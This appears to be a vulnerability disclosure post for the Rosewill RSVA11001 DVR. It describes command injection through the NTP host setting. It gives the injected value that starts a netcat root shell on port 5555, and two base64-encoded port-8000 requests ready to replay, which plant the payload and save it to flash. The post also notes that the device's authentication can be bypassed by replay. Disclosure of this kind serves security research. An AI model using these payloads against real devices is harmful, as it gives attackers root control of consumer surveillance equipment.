I have been hacking on a Rosewill RSVA11001 for a while now, something to
suck up my free time. I had pulled apart the firmware previously but did
not succeed in finding a way to get a shell on the device. The box is
Hi3515 based, I found an exploit for another similar box (Ray Sharp) but it
did not work. The Rosewill firmware seems to use an executable that listens
on two ports rather one when communicating with the Windows-based control
software. Port 8000 is now the command port rather 9000, 9000 is used for
video only. After playing with the included Windows application I
eventually did a strings on the 'hi_dvr' exectuable that is the user space
program that controls the interface to thing. I found this gem:

/mnt/ntpdate -q %s > /tmp/tmpfs/ntptmp

So I used the windows software to set the NTP host to

a;/usr/bin/nc -l -p 5555 -e /bin/sh&

Next I power cycled the box and a root shell was waiting a minute later on
the port. By default it runs this command on startup and once a day. So if
the exploit is remote-only there will be a delay period. Of course, the
'authentication' done on the command port is just a charade to the user as
previously described in other exploits. You only need to replay the packets
from my capture session to pull this exploit off.

The box is not very interesting once you are in. It's a linux 2.6.24 kernel
with RT patches and busy box user space. I don't have access to the SDK for
Hi3515 (different than Hi3511). The kernel modules for Video Input, Video
Output, Audio Output, H264 encoding etc are there but in binary only (non
stripped) form.

To set the NTP host to the request to replay to port 8000 tcp is:

UkVNT1RFIEhJX1NSREtfVElNRV9TZXRUaW1lU2V0QXR0ciBNQ1RQLzEuMA0KQ1NlcTo2Ng0KQWNj
ZXB0OnRleHQvSERQDQpDb250ZW50LVR5cGU6dGV4dC9IRFANCkZ1bmMtVmVyc2lvbjoweDEwDQpD
b250ZW50LUxlbmd0aDoxMjQNCg0KU2VnbWVudC1OdW06MQ0KU2VnbWVudC1TZXE6MQ0KRGF0YS1M
ZW5ndGg6NzYNCg0KAQAGAWE7L3Vzci9iaW4vbmMgLWwgLXAgNTU1NSAtZSAvYmluL3NoAA4jAQBA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==

The second request to the same port causes the device to save its flash
memory:

UkVNT1RFIEhJX1NSREtfREVWX1NhdmVGbGFzaCBNQ1RQLzEuMA0KQ1NlcTo0MQ0KQWNjZXB0OnRl
eHQvSERQDQpDb250ZW50LVR5cGU6dGV4dC9IRFANCkZ1bmMtVmVyc2lvbjoweDEwDQpDb250ZW50
LUxlbmd0aDoxNQ0KDQpTZWdtZW50LU51bTowDQo=

The Rosewill RSVA12001 is the same unit with different supplied cameras and
should have the same vulnerability.